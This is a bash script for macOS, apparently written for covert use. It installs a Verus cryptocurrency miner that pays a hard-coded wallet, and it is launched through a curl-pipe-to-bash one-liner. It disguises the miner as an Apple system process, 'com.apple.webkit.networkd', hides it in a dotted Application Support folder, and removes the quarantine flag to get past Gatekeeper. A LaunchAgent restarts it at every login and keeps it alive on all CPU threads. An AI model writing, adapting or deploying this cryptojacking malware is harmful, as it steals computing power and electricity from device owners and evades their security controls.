#!/usr/bin/env bash
# ============================================================
# mine.sh — Silent Verus (VRSC) CPU miner for macOS ARM
# Works on M1 / M2 / M3 / M4 — any Apple Silicon
# Process appears as: "com.apple.webkit.networkd"
# Run: curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine.sh | bash
# ============================================================

WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
WORKER="mac1"
POOL_HOST="na.luckpool.net"
POOL_PORT="3956"
THREADS=$(sysctl -n hw.logicalcpu)

# ---- disguise paths ----
DISGUISE_NAME="com.apple.webkit.networkd"
INSTALL_DIR="$HOME/Library/Application Support/.wknd"
BINARY_PATH="$INSTALL_DIR/$DISGUISE_NAME"
PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"

# ---- sanity: must be macOS arm64 ----
if [[ "$(uname)" != "Darwin" ]]; then
  echo "[!] This script is for macOS only."
  exit 1
fi

ARCH=$(uname -m)

echo "[*] Setting up on macOS ${ARCH} — ${THREADS} threads"
mkdir -p "$INSTALL_DIR"
mkdir -p "$HOME/Library/LaunchAgents"
mkdir -p "$HOME/Library/Logs"

# ---- download miner binary ----
if [[ ! -f "$BINARY_PATH" ]]; then
  if [[ "$ARCH" == "arm64" ]]; then
    DL="https://github.com/Oink70/ccminer-verus/releases/download/v3.8.3c-CPU-only/ccminer-v3.8.3c-oink_ARM"
  else
    DL="https://github.com/Oink70/ccminer-verus/releases/download/v3.8.3c-CPU-only/ccminer-v3.8.3c-oink_x86-64"
  fi
  echo "[*] Downloading miner..."
  curl -fsSL "$DL" -o "$BINARY_PATH"
  chmod +x "$BINARY_PATH"
  # strip quarantine so macOS doesn't block it
  xattr -d com.apple.quarantine "$BINARY_PATH" 2>/dev/null || true
  echo "[*] Binary ready."
else
  echo "[*] Binary already installed — skipping download."
fi

# ---- stop old instance if running ----
launchctl unload "$PLIST_PATH" 2>/dev/null || true
sleep 1

# ---- write launchd plist (auto-start on login) ----
cat > "$PLIST_PATH" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>             <string>${DISGUISE_NAME}</string>
  <key>ProgramArguments</key>
  <array>
    <string>${BINARY_PATH}</string>
    <string>-a</string>    <string>verus</string>
    <string>-o</string>    <string>stratum+tcp://${POOL_HOST}:${POOL_PORT}</string>
    <string>-u</string>    <string>${WALLET}.${WORKER}</string>
    <string>-p</string>    <string>x</string>
    <string>-t</string>    <string>${THREADS}</string>
  </array>
  <key>RunAtLoad</key>         <true/>
  <key>KeepAlive</key>         <true/>
  <key>StandardOutPath</key>   <string>${LOG_PATH}</string>
  <key>StandardErrorPath</key> <string>${LOG_PATH}</string>
  <key>ProcessType</key>       <string>Background</string>
  <key>Nice</key>              <integer>10</integer>
</dict>
</plist>
PLIST

# ---- launch it ----
launchctl load -w "$PLIST_PATH"

echo ""
echo "=========================================="
echo " Miner running silently in background"
echo " Process : $DISGUISE_NAME"
echo " Wallet  : $WALLET"
echo " Pool    : $POOL_HOST:$POOL_PORT"
echo " Threads : $THREADS"
echo " Log     : $LOG_PATH"
echo "=========================================="
echo ""
echo "  Check : launchctl list | grep webkit.networkd"
echo "  Logs  : tail -f \"$LOG_PATH\""
echo "  Stop  : launchctl unload \"$PLIST_PATH\""
